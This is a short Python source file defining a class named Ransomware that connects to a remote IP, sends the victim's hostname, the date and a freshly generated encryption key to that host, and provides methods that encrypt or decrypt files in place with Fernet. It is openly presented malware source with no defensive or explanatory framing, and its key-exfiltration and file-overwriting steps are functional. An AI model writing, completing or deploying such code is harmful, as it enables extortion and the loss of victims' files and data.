from network import Client
from datetime import date
from cryptography.fernet import Fernet

class Ransomware:
  def __init__(self, ip):
    self.ip = ip
    client = Client(ip)
    self.hostname = client.gethostname()
    self.key = Fernet.generate_key()
    client.send(self.hostname + " connected on " + str(date.today()) + " with key: " + str(self.key.decode()))

  def encrypt(self, filename, key):
    f = Fernet(key)

    with open(filename, "rb") as file:
      file_data = file.read()

    encrypted_data = f.encrypt(file_data)

    with open(filename, "wb") as file:
      file.write(encrypted_data)


  def decrypt(self, filename, key):
    f = Fernet(key)

    with open(filename, "rb") as file:
      encrypted_data = file.read()

    decrypted_data = f.decrypt(encrypted_data)

    with open(filename, "wb") as file:
      file.write(decrypted_data)